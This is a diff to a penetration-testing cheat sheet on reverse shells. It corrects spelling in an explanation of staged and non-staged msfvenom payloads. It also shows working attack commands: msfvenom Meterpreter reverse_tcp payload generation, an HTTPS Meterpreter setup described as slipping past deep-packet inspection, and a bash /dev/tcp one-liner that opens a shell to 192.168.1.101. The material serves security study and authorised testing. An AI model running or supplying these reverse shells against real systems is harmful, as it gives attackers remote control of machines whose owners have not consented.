@@ -7,11 +7,9 @@ This is s great collection of different types of reverse shells and webshells. M
 
 ## Msfvenom
 
-There is more info on this topic in the metasploit chapter in /exploiting.
+There is an important difference between non-staged and staged payload. A **non-staged** shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat.
 
-Therse is an important difference between non-staged and staged payload. A **non-staged** shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat.
-
-**staged** shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide upp the payload. Meterpreter is a staged shell. First it sends some parts of it and sents up the connetion, and then it sends some more. This can be caught with metasploit multi-handlet but not with netcat.
+**staged** shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide up the payload. Meterpreter is a staged shell. First it sends some parts of it and sets up the connection, and then it sends some more. This can be caught with metasploit multi-handler but not with netcat.
 
 ### Windows
 
@@ -29,6 +27,7 @@ set payload windows/meterpreter/reverse_tcp
 ```
 
 **Meterpreter HTTPS**  
+
 It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections.
 
 ```
@@ -76,11 +75,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f e
 ### Bash
 
 ```
-0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
-```
-
-```
-exec /bin/bash 0&0 2>&0
+0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
 ```
 
 ```
